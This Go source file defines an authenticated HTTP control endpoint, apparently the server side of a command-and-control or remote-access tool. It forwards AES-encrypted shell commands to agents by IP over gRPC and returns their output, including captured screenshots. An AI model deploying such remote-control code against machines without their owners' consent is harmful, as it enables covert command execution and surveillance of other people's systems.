/*
 * @Description:
 * @Version: 2.0
 * @Autor: ABing
 * @Date: 2024-06-19 11:14:31
 * @LastEditors: lhl
 * @LastEditTime: 2024-06-20 16:12:25
 */

package router

import (
	"encoding/base64"
	"gotoexec/global"
	"gotoexec/grpcapi"
	"gotoexec/middlewares"
	"gotoexec/server/control"
	"gotoexec/util"
	"log"
	"net/http"
	"strings"

	"github.com/gin-gonic/gin"
)

func InitControlRouter(Router *gin.RouterGroup) {
	p := Router.Group("control").Use(middlewares.CostTime()).Use(middlewares.BasicAuth())
	{
		p.POST("", func(context *gin.Context) {

			cmd := context.PostForm("cmd")
			ip := context.PostForm("ip")
			gcmd := new(grpcapi.Command)
			gcmd.In, _ = util.EncryptByAes([]byte(cmd))
			gcmd.Ip = ip

			cmdout, err := control.ControlInstance.RunCommand(gcmd)

			if err != nil {
				log.Panicln(err)
			}

			log.Println(cmdout.Out)
			if cmdout.Out == "off" {
				context.JSON(http.StatusOK, gin.H{
					"code": http.StatusBadRequest,
					"data": "不在线",
					"msg":  "health",
				})
				return
			}

			outstring := ""

			switch cmd {
			case "screenshot":
				images := strings.Split(cmdout.Out, ";")

				for _, j := range images {
					if j == "" {
						break
					}
					image, err := util.DecryptByAes(j)
					if err != nil {
						log.Fatal(err.Error())
					}
					outstring += (base64.StdEncoding.EncodeToString(image) + ";")
				}
			default:
				out, err := util.DecryptByAes(cmdout.Out)

				if err != nil {
					log.Panicln(err)
				}
				outstring = string(out)
			}

			context.JSON(http.StatusOK, gin.H{
				"code": http.StatusOK,
				"data": outstring,
				"msg":  "health",
			})
		})

		p.GET("", func(context *gin.Context) {

			context.JSON(http.StatusOK, gin.H{
				"code": http.StatusOK,
				"data": global.FixedSizeStackInstance.Get(),
				"msg":  "health",
			})
		})

	}
}
